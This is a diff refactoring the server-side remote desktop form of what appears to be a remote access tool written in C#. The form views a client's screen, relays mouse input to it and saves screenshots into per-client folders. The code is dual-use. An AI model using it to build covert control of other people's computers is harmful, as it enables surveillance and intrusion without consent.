@@ -10,7 +10,7 @@ using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
-using Server.Sockets;
+using Server.Connection;
 using Server.MessagePack;
 using System.Threading;
 using System.Drawing.Imaging;
@@ -21,24 +21,32 @@ namespace Server.Forms
 {
     public partial class FormRemoteDesktop : Form
     {
-        public FormRemoteDesktop()
-        {
-            InitializeComponent();
-        }
-
         public Form1 F { get; set; }
-        internal Clients C { get; set; }
-        internal Clients C2 { get; set; }
-        public bool Active { get; set; }
+        internal Clients ParentClient { get; set; }
+        internal Clients Client { get; set; }
+        public string FullPath { get; set; }
+
         public int FPS = 0;
         public Stopwatch sw = Stopwatch.StartNew();
         public Stopwatch RenderSW = Stopwatch.StartNew();
         public IUnsafeCodec decoder = new UnsafeStreamCodec(60);
         public Size rdSize;
         private bool isMouse = false;
+
+
+        public FormRemoteDesktop()
+        {
+            InitializeComponent();
+        }
+
+
         private void timer1_Tick(object sender, EventArgs e)
         {
-            if (!C.ClientSocket.Connected) this.Close();
+            try
+            {
+                if (!ParentClient.TcpClient.Connected) this.Close();
+            }
+            catch { this.Close(); }
         }
 
         private void Button2_Click(object sender, EventArgs e)
@@ -79,7 +87,7 @@ namespace Server.Forms
                 msgpack.ForcePathObject("Quality").AsInteger = Convert.ToInt32(numericUpDown1.Value.ToString());
                 msgpack.ForcePathObject("Screen").AsInteger = Convert.ToInt32(numericUpDown2.Value.ToString());
                 decoder = new UnsafeStreamCodec(Convert.ToInt32(numericUpDown1.Value));
-                ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
+                ThreadPool.QueueUserWorkItem(ParentClient.Send, msgpack.Encode2Bytes());
                 numericUpDown1.Enabled = false;
                 numericUpDown2.Enabled = false;
                 button1.Tag = (object)"stop";
@@ -90,8 +98,8 @@ namespace Server.Forms
                 button1.Tag = (object)"play";
                 try
                 {
-                    C2.Disconnected();
-                    C2 = null;
+                    Client.Disconnected();
+                    Client = null;
                 }
                 catch { }
                 numericUpDown1.Enabled = true;
@@ -120,10 +128,9 @@ namespace Server.Forms
                     btnSave.BackgroundImage = Properties.Resources.save_image2;
                     try
                     {
-                        string fullPath = Path.Combine(Application.StartupPath, "ClientsFolder\\" + C.ID + "\\RemoteDesktop");
-                        if (!Directory.Exists(fullPath))
-                            Directory.CreateDirectory(fullPath);
-                        Process.Start(fullPath);
+                        if (!Directory.Exists(FullPath))
+                            Directory.CreateDirectory(FullPath);
+                        Process.Start(FullPath);
                     }
                     catch { }
                 }
@@ -134,15 +141,14 @@ namespace Server.Forms
         {
             try
             {
-                string fullPath = Path.Combine(Application.StartupPath, "ClientsFolder\\" + C.ID + "\\RemoteDesktop");
-                if (!Directory.Exists(fullPath))
-                    Directory.CreateDirectory(fullPath);
+                if (!Directory.Exists(FullPath))
+                    Directory.CreateDirectory(FullPath);
                 Encoder myEncoder = Encoder.Quality;
                 EncoderParameters myEncoderParameters = new EncoderParameters(1);
                 EncoderParameter myEncoderParameter = new EncoderParameter(myEncoder, 50L);
                 myEncoderParameters.Param[0] = myEncoderParameter;
                 ImageCodecInfo jpgEncoder = GetEncoder(ImageFormat.Jpeg);
-                pictureBox1.Image.Save(fullPath + $"\\IMG_{DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss")}.jpeg", jpgEncoder, myEncoderParameters);
+                pictureBox1.Image.Save(FullPath + $"\\IMG_{DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss")}.jpeg", jpgEncoder, myEncoderParameters);
                 myEncoderParameters?.Dispose();
                 myEncoderParameter?.Dispose();
             }
@@ -181,7 +187,7 @@ namespace Server.Forms
                     msgpack.ForcePathObject("X").AsInteger = p.X;
                     msgpack.ForcePathObject("Y").AsInteger = p.Y;
                     msgpack.ForcePathObject("Button").AsInteger = button;
-                    ThreadPool.QueueUserWorkItem(C2.Send, msgpack.Encode2Bytes());
+                    ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                 }
             }
             catch { }
@@ -206,7 +212,7 @@ namespace Server.Forms
                     msgpack.ForcePathObject("X").AsInteger = (Int32)(p.X);
                     msgpack.ForcePathObject("Y").AsInteger = (Int32)(p.Y);
                     msgpack.ForcePathObject("Button").AsInteger = (Int32)(button);
-                    ThreadPool.QueueUserWorkItem(C2.Send, msgpack.Encode2Bytes());
+                    ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                 }
             }
             catch { }
@@ -224,7 +230,7 @@ namespace Server.Forms
                     msgpack.ForcePathObject("Option").AsString = "mouseMove";
                     msgpack.ForcePathObject("X").AsInteger = (Int32)(p.X);
                     msgpack.ForcePathObject("Y").AsInteger = (Int32)(p.Y);
-                    ThreadPool.QueueUserWorkItem(C2.Send, msgpack.Encode2Bytes());
+                    ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                 }
             }
             catch { }
@@ -242,6 +248,15 @@ namespace Server.Forms
                 isMouse = true;
                 btnMouse.BackgroundImage = Properties.Resources.mouse_enable;
             }
+        }
+
+        private void FormRemoteDesktop_FormClosed(object sender, FormClosedEventArgs e)
+        {
+            try
+            {
+                Client?.Disconnected();
+            }
+            catch { }
         }
     }
 }
